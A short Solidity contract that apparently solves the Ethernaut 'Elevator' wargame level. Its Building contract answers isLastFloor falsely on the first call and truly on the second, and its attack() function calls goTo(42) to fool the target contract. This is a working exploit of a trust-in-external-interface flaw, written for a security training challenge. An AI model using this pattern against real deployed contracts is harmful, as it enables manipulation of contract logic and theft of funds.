// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {

    bool called;
    address elevator;

    constructor(address _elevator) {
        require(_elevator != address(0));
        elevator = _elevator;
    }

    function isLastFloor(uint) external returns (bool) {
        bool _called = called;
        called = true;
        return _called;
    }

    function attack() external {
        Elevator(elevator).goTo(42);
    }
}
